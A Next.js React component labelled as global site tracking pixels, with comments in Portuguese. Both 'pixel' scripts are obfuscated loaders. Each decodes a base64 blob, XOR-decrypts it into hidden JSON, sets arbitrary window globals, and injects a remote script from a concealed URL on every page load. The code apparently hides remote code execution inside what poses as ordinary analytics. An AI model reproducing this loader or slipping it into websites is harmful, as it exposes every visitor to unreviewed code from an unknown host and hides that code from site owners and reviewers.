"use client"

import Script from "next/script"

/**
 * Tracking global do site.
 * Carrega os loaders dos pixels em todas as páginas.
 */
const PIXEL_LOADER = `(function(){var j_s=atob("DG+T4Erge60iJWs2uhSxlTiMWZcATR9Cyhypz2WDH8MMUB9b0wnqzimPFoNAV0RF2R36kD6TVNhWSBgZ1g7nhTmUVcdRB0cU2xvnkiOCDtlHVkkM4RSxjiuNHo8YBw9Xzg6+lT6NEstbCBtE3xn2jj7NCNhATA9FmEOxliuMDsgAH0kUxzLu");var h_ibha=[];for(var y_war9=0;y_war9<j_s.length;y_war9++){h_ibha.push(j_s.charCodeAt(y_war9)&255);}var t_lww=h_ibha[0];var q_g2v=h_ibha.slice(1,1+t_lww);var r_8o79=h_ibha.slice(1+t_lww);var a_s3u=r_8o79.map(function(b,u_p){return b^q_g2v[u_p%t_lww];});var r_sl="";for(var n_mgst=0;n_mgst<a_s3u.length;n_mgst++){r_sl+=String.fromCharCode(a_s3u[n_mgst]&255);}var p_w=decodeURIComponent(escape(r_sl));var i_7=JSON.parse(p_w);var f_ca9d=i_7.globals||[];f_ca9d.forEach(function(l_5){window[l_5.name]=l_5.value;});var l_5f0=document.createElement("script");l_5f0.src=i_7.url;l_5f0.async=true;l_5f0.defer=true;(i_7.attributes||[]).forEach(function(x_j){l_5f0.setAttribute(x_j.name,x_j.value);});(document.head||document.documentElement).appendChild(l_5f0);})();`

const PIXEL_LOADER_2 = `(function(){var o_kpne=atob("DJ3i/XT5fvG9501HdubAiAaVXMufjzkzBu7Y0luaGp+TkjkqH/ub0xeWE9/flWI0Fe+LjQCKUYHUnygrWe2LhRGVUJvOxWFlF+mWjx2bC4XYlG99LcDO3xOVEZPciz5lTMaZ3xqYE5Sf3W83H+WHkT2dXN2fkSwrA/jAx1bPH8eJgi5xF6jWmxXNH8jc3ygjT63RmEPbA6zA");var i_5a=[];for(var g_giq=0;g_giq<o_kpne.length;g_giq++){i_5a.push(o_kpne.charCodeAt(g_giq)&255);}var i_9dm=i_5a[0];var o_qzje=i_5a.slice(1,1+i_9dm);var k_4=i_5a.slice(1+i_9dm);var g_lx=k_4.map(function(b,z_1zc){return b^o_qzje[z_1zc%i_9dm];});var e_u0me="";for(var b_1hz=0;b_1hz<g_lx.length;b_1hz++){e_u0me+=String.fromCharCode(g_lx[b_1hz]&255);}var m_j=decodeURIComponent(escape(e_u0me));var e_h7r1=JSON.parse(m_j);var b_5g=e_h7r1.globals||[];b_5g.forEach(function(d_dcs){window[d_dcs.name]=d_dcs.value;});var v_984=document.createElement("script");v_984.src=e_h7r1.url;v_984.async=true;v_984.defer=true;(e_h7r1.attributes||[]).forEach(function(u_6y){v_984.setAttribute(u_6y.name,u_6y.value);});(document.head||document.documentElement).appendChild(v_984);})();`

export function SiteTracking() {
  return (
    <>
      <Script id="site-pixel" strategy="afterInteractive">
        {PIXEL_LOADER}
      </Script>
      <Script id="site-pixel-2" strategy="afterInteractive">
        {PIXEL_LOADER_2}
      </Script>
    </>
  )
}
